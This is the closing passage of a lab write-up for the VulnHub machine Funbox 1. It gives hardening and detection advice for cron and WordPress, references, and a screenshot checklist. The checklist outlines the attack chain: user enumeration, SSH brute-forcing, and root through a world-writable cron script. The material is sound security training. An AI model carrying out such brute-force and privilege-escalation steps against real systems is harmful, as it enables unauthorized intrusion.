- **Fix file permissions and cron hygiene.** Cron scripts must be owned by root and
  **not** writable by anyone else (`chmod 755`/`700`, root-owned directory). Never
  let a root job execute a file inside a normal user's home. Audit with
  `find / -perm -o+w -type f`.
- **Harden WordPress generally:** remove unused themes/plugins, keep core patched,
  and disable the built-in theme/plugin editor (`define('DISALLOW_FILE_EDIT', true)`).
- **Detection ideas:** alert on WordPress brute-force patterns and `xmlrpc.php`
  floods; monitor SSH auth failures; watch for writes to cron-adjacent or world-
  writable files and for new outbound connections from the host; baseline the
  content of scheduled scripts and alert on change.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: <https://vulnhub.com/entry/funbox-1,518/>
- Download mirror: <https://download.vulnhub.com/funbox/FunBox.ova>
- Community writeups consulted:
  - [Funbox 1 — VulnHub walkthrough (Doyler.net)](https://www.doyler.net/security-not-included/funbox-1-vulnhub-walkthrough)
- Docs / tools:
  - [WPScan](https://wpscan.com/)
  - [OWASP — Brute Force Attack](https://owasp.org/www-community/attacks/Brute_force_attack)
  - [GTFOBins / rbash escape](https://gtfobins.github.io/)
  - [pspy — unprivileged process monitoring](https://github.com/DominicBreuker/pspy)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target with `arp-scan`
- [ ] `images/02-nmap.png` — port/service scan and `wpscan` user enumeration
- [ ] `images/03-enum.png` — the virtual-host redirect fixed in `/etc/hosts`
- [ ] `images/04-foothold.png` — brute-forcing `joe` and logging in over SSH
- [ ] `images/05-shell.png` — shell as `joe`
- [ ] `images/06-privesc.png` — the world-writable `/home/funny/.backup.sh`
- [ ] `images/07-root-flag.png` — root shell from the cron job

---

_Part of the [Cybersecurity101-Labs](../../README.md) collection. See the complete [catalog](../../docs/CATALOG.md)._
